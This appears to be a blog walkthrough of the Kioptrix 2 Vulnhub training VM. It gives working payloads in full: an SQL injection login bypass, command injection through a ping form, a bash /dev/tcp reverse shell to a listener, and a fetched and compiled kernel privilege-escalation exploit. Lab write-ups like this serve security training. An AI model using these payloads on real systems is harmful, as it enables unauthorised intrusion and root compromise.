---
layout: post
title: "Kioptrix 2 Walkthrough (Vulnhub)"
date: 2016-12-15 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough, Kioptrix series]
---

_Kioptrix 2 VM can be downloaded [here](https://www.vulnhub.com/entry
/kioptrix-level-11-2,23/)._

## 0\. Get VMs IP

```console
root@kali:~# netdiscover -r 192.168.1.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts

 260 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 15600
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.1.67    c4:e9:84:10:d3:5e    255   15300  TP-LINK TECHNOLOGIES CO.,LTD.
 **...**
```

## 1\. Enumeration

### 1.1 TCP Ports enumeration

```console
root@kali:~# nmap 192.168.1.67 -sV

Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-15 00:30 EST
Nmap scan report for 192.168.1.67
Host is up (0.000049s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
```

Hmm, some interesting services we see running on the machine. Most of these are pretty old. I did a quick search for existing exploits and didn't find any. It's still very possible that other vulnerabilities exist, yet I decided to check the web server running first.

Note: I didn't do a full TCP scan as it was taking way too long. Running it in
the background after the initial scan is might be useful.

_____________________________________________________________________________

## 2\. Web server

#### 2.1 Login form

<table align="center" border="1" cellpadding="2" cellspacing="2" style="width: 300px;">  <tbody>
<tr>    <td align="center" colspan="2"><b>Remote System Administration Login</b>    </td>   </tr>
<tr>    <td width="150">Username</td>    <td><input name="uname" type="text" /></td>   </tr>
<tr>    <td width="150">Password</td>    <td><input name="psw" type="password" />    </td>   </tr>
<tr>    <td align="center" colspan="2"><input name="btnLogin" type="submit" value="Login" />    </td>   </tr>
</tbody></table>
 

Hitting `http://192.168.1.67` shows us a login form, possibly vulnerable to SQL injection. I tried the vanilla `admin' or 1=1 #` and it worked!

Why did it work? Possibly because the query is in this form:

```sql
SELECT * from users where username="$_REQUEST["username"]" and password="$_REQUEST["password"]"
```

After submitting `admin" or 1=1 #`, it's evaluated to:

```sql
SELECT * from users where username="admin" or 1=1 # //ignored
```
which logs us in as admin.


#### 2.2 Admin interface

<h4>
<form action="pingit.php" method="post" name="ping" target="_blank">
<table border="1" style="width: 600px;">  <tbody>
<tr valign="middle">    <td align="center" colspan="2"><b>Welcome to the Basic Administrative Web Console</b>    </td>   </tr>
<tr valign="middle">    <td align="center">Ping a Machine on the Network:    </td>     <td align="center"><input name="ip" size="30" type="text" />     <input name="submit" type="submit" value="submit" />    </td>    </tr>
</tbody></table>
</form>
</h4>

This looks very vulnerable to an RCE (Remote Code Injection) attack. Let's try appending commands to it.


  * **Input:**  127.0.0.1
    **Output:**
```
    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.010 ms
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms
    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.012 ms
    
    --- 127.0.0.1 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 1998ms
    rtt min/avg/max/mdev = 0.010/0.011/0.012/0.003 ms, pipe 2
```

  * **Input:**  127.0.0.1; whoami
    **Output:**
```
    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.007 ms
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms
    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.013 ms
    
    --- 127.0.0.1 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 1999ms
    rtt min/avg/max/mdev = 0.007/0.010/0.013/0.004 ms, pipe 2
    apache
```


`whoami` returned apache! We're able to execute arbitrary commands. Let's get a shell by starting a listener on attacking machine.

```console
root@kali:~# nc -nvlp 443
listening on [any] 443 ...
```

Then getting a reverse shell connected to it.

**Input:** 127.0.0.1; bash -i &gt;&amp; /dev/tcp/192.168.1.69/443 0&gt;&amp;1
**Output on attacking machine:**
```console
    root@kali:~# nc -nvlp 443
    listening on [any] 443 ...
    connect to [192.168.1.69] from (UNKNOWN) [192.168.1.67] 32769
    bash: no job control in this shell
    bash-3.00$
```
Awesome! We got a shell as apache user.

_____________________________________________________________________________

## 3\. Getting root

Basic enumeration will reveal that this CentOS version **(4.5 Final) **is vulnerable to  [ CVE-2009-2698 ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2698)
Exploit can be found [here](https://www.exploit-db.com/exploits/9542/).

```console
root@kali:~# nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.1.69] from (UNKNOWN) [192.168.1.67] 32769
bash: no job control in this shell
bash-3.00$ cat /etc/issue
Welcome to Kioptrix Level 2 Penetration and Assessment Environment
--The object of this game:
|_Acquire "root" access to this machine.
There are many ways this can be done, try and find more then one way to
appreciate this exercise.
DISCLAIMER: Kioptrix is not resposible for any damage or instability
caused by running, installing or using this VM image.
Use at your own risk.
WARNING: This is a vulnerable system, DO NOT run this OS in a production
environment. Nor should you give this system access to the outside world
(the Internet - or Interwebs..)

Good luck and have fun!
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
bash-3.00$ uname -mrs
Linux 2.6.9-55.EL i686
bash-3.00$ cat /etc/redhat-release
CentOS release 4.5 (Final)
bash-3.00$ cd /tmp
bash-3.00$ wget https://www.exploit-db.com/download/9542 --no-check-certificate
--23:08:44--  https://www.exploit-db.com/download/9542
           => `9542'
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate
WARNING: certificate common name `*.sucuri.net' doesn't match requested host name `www.exploit-db.com'.
HTTP request sent, awaiting response... 200 OK
Length: 2,645 (2.6K) [application/txt]

    0K ..                                                    100%  210.21 MB/s

23:08:45 (210.21 MB/s) - `9542' saved [2645/2645]

bash-3.00$ ls
9542
index.html
bash-3.00$ mv 9542 a.c
bash-3.00$ gcc a.c
bash-3.00$ ./a.out
sh: no job control in this shell
sh-3.00#
```

Quite easy and straight forward! 

